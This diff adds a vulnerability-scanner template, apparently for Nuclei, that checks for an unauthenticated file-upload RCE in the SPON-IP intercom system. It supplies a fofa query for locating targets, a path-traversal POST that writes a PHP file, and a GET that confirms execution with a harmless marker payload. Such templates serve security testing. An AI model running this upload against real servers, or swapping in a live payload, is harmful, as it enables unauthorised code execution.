@@ -1,0 +1,38 @@
+id: SPON-IP-videobacktrackpush_php-File-upload
+
+info:
+  name: "世邦通信SPON-IP网络对讲广播系统videobacktrackpush.php接口远程代码执行"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="vendors/toastr-master/build/toastr.min.js"
+      世邦通信SPON-IP网络对讲广播系统在videobacktrackpush.php接口中存在文件上传逻辑缺陷，攻击者可利用此漏洞在目标服务器上执行任意代码，导致远程代码执行（RCE）。该漏洞允许未经授权的请求者部署恶意负载，获取系统权限，并进一步控制整个Web服务器环境。
+  reference:
+  - https://mp.weixin.qq.com/s/vFQVqG7gFMWSzb9d6VOzIw
+  tags: 世邦通信SPON-IP网络对讲广播系统
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /php/videobacktrackpush.php HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36(KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+    Content-Type: application/x-www-form-urlencoded
+
+    jsondata[caller]=1&jsondata[callee]=../../../../../../ICPAS/Wnmp/WWW&jsondata[videoname]=r_c_e.php&jsondata[videocontent]=PD9waHAgcHJpbnQoMTExKjIyMik7dW5saW5rKF9fRklMRV9fKTs/Pg==
+- raw:
+  - |
+    GET /r_c_e.php HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '24642'
+  - type: status
+    status:
+    - 200
